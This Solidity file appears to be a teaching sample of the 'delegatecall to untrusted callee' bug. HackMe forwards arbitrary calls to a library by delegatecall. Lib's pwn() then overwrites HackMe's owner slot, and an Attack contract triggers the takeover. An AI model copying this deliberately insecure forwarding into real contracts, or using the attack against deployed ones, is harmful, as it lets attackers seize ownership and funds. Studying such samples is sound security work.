pragma solidity 0.8.0;
//Delegatecall to Untrusted Callee
contract Lib {
   address public owner;
    function pwn() public {
        owner = msg.sender;}}

contract HackMe {
    address public owner_HackMe;
    Lib public lib;
    constructor(Lib _lib) {
        owner_HackMe = msg.sender;
        lib = Lib(_lib);}
    fallback() external payable   {
        address(lib).delegatecall(msg.data);}
}

contract Attack {
    address public hackMe;
    constructor(address _hackMe) {
        hackMe = _hackMe;}

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));}
}